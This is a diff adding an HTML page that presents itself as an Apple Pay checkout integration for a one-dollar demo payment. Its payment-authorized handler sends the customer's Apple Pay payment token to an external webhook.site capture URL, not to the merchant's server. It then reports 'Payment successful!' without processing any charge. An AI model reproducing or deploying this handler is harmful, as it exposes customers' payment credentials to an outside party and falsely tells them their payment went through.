@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apple Pay Integration</title>
+</head>
+<body>
+<h1>Apple Pay Integration</h1>
+<button id="applePayButton">Pay with Apple Pay</button>
+
+<script>
+    document.getElementById('applePayButton').addEventListener('click', async () => {
+        if (window.ApplePaySession && ApplePaySession.canMakePayments()) {
+            const paymentRequest = {
+                countryCode: 'US',
+                currencyCode: 'USD',
+                supportedNetworks: ['visa', 'masterCard', 'amex'],
+                merchantCapabilities: ['supports3DS'],
+                total: {
+                    label: 'Demo Payment',
+                    amount: '1.00'
+                }
+            };
+
+            const session = new ApplePaySession(3, paymentRequest);
+
+            session.onvalidatemerchant = async (event) => {
+                const validationURL = event.validationURL;
+                const response = await fetch('/validate-merchant', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ validationURL })
+                });
+                const merchantSession = await response.json();
+                session.completeMerchantValidation(merchantSession);
+            };
+
+            session.onpaymentauthorized = async (event) => {
+                const paymentToken = event.payment.token;
+                await fetch('https://webhook.site/3e1a5a6d-e280-4464-8f2a-a05b70f2d0cf', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ token: paymentToken })
+                });
+                session.completePayment(ApplePaySession.STATUS_SUCCESS);
+                alert('Payment successful!');
+            };
+
+            session.begin();
+        } else {
+            alert('Apple Pay is not available on this device.');
+        }
+    });
+</script>
+</body>
+</html>
